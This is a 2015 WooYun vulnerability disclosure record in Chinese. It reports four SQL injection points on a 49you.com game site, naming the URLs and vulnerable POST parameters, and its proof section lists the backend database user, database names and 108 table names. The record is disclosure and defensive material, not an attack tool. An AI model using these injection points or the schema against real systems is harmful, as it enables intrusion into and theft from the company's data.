{"id": 25133, "wybug_id": "wooyun-2015-0132767", "wybug_title": "游戏安全之上海49游某站四处SQL注入打包", "wybug_corp": "49you.com", "wybug_author": "hh2014", "wybug_date": "2015-08-09 00:17", "wybug_open_date": "2015-09-26 10:30", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "18", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注射"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-08-09：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-08-12：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-08-22：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-09-01：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-09-11：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-09-26：\t细节向公众公开  简要描述： RT 详细说明：  四处，多个参数，前三处为基于时间的盲注 注入点1：\nhttp://dj.49you.com/web/tab/manage.jsp?action=updatesave&id=11&type=2post参数Submit=%e6%9b%b4%e6%96%b0&gamename=umNWC3sWgamename参数存在注入id参数存在注入type参数存在注入\n注入点2：\nhttp://dj.49you.com/web/tab/QdGameIncome.jsppost参数appname=K3LpTenr&beginTime=2015-08-08&endTime=2015-08-08&spname=%e5%8c%97%e4%ba%ac%e5%88%9b%e6%84%8f%e6%af%94%e7%89%b9%e4%bf%a1%e6%81%af%e6%8a%80%e6%9c%af%e6%9c%89%e9%99%90%e5%85%ac%e5%8f%b8appname参数存在注入beginTime参数存在注入\n注入点3：\nhttp://dj.49you.com/web/tab/SKGameIncome.jsppost参数beginTime=YKhEUkTW&cpName=%e7%88%b1%e8%b5%a2&endTime=2015-08-08&gameNamestr=%e8%b5%a2%e8%af%9d%e8%b4%b9%e8%bf%9e%e8%bf%9e%e7%9c%8bbeginTime参数存在注入cpName参数存在注入endTime参数存在注入gameNamesr参数存在注入\n注入点4：\nhttp://dj.49you.com/web/ltsjyx_income.jsppost参数：beginTime=-1&endTime=1beginTime参数存在注入endTime参数存在注入\n   漏洞证明：  \nweb application technology: Nginxback-end DBMS: Microsoft SQL Server 2012current user:    'sp'current database:    'SP'current user is DBA:    Falseavailable databases [17]:[*] Administration[*] blacklist[*] Company[*] DataBack[*] master[*] model[*] msdb[*] new_system[*] NZIformation[*] ReportServer[*] ReportServerTempDB[*] shouYou[*] SP[*] SP2[*] tempdb[*] Test[*] wap_gameweb application technology: Nginx, JSPback-end DBMS: Microsoft SQL Server 2012Database: SP[108 tables]+---------------------+| CityList            || Ctstats             || DHXGame_User        || DXBaoYueZDYJH       || OnlineProvince      || PcInterface         || ProvinceCity        || ProvinceList        || amountTable         || baoyue              || baoyue2             || black_imsi          || by_send             || cp_channel          || cpbaccount          || cppay               || cppay_date          || cppay_pro           || dx_imsinum_mrtj     || dx_phonenum_motj    || dx_phonenum_mrtj    || dxbaoyuesendrecord  || dxopencity          || dxspid              || fee_request         || fee_request1        || fp                  || fptaxrate           || game                || gameIncome          || gametype            || gamezhou            || hourinfo            || imei                || importtxt           || imsi                || imsi0716            || interfaceAgency     || kftsManage          || ltgamerecv          || ltsjyx              || ltwogame            || mmLoginInfor        || mmOrder             || mmShow              || mm_list             || mm_rule             || mmcompany           || mmctrl              || mmqrecv             || mmrecv              || monthinformation    || mosync              || mrsync              || newCityList         || nz_cp               || pb_cp               || pcgame              || pcgameid            || pcweb               || pinbi_cp            || price               || pro_tj              || recv_mo             || recvrecord          || rules               || send_mr             || sendrecord          || servicetype         || settlement          || settlement_back     || settlement_pro      || sjqbrecv            || smsrecv             || sq_phonenum_tj      || tb_Day_Stat         || tb_LINE             || tb_LyDay_Stat       || tb_LyDay_Stat0707   || tb_LyDay_Stat_0702  || tb_SP               || tb_byDDmo           || tb_byDDmr           || tb_informMM         || tb_monthcalculate   || tb_spinformation    || tb_sppay            || tb_wyurlmanage      || telimsi             || telrecv             || telrecvs            || temp_send           || temp_send1          || temp_send2          || testsendrecord      || text                || textlink            || tj                  || tjOrd2              || tjbakbak            || update_rules_record || vbtj                || vw_rules            || wjwar               || wx_Login_Type       || wx_User             || xiaoguobiao         || zxf_cp              |+---------------------+\n   修复方案：  参数过滤   版权声明：转载请注明来源 hh2014@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2015-08-12 10:28 厂商回复： 我们已经确定问题了。谢谢路人甲同学 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-08-19 20:10 |    \t\t猫和老鼠 \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:3        | ...)\t\t \n  这个厂商不就是那个说悬赏3W元的骗子吗。骗术不错    \n     2015-08-19 21:20 |    \t\t小龙 \t\t\t( 普通白帽子  |\t\t\t        Rank:1208 漏洞数:316        | 乌云有着这么一群人，在乌云学技术，去某数...)\t\t \n  @猫和老鼠  礼物都不肯送- - 你说这种人是怎么被单位录用的呢？    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}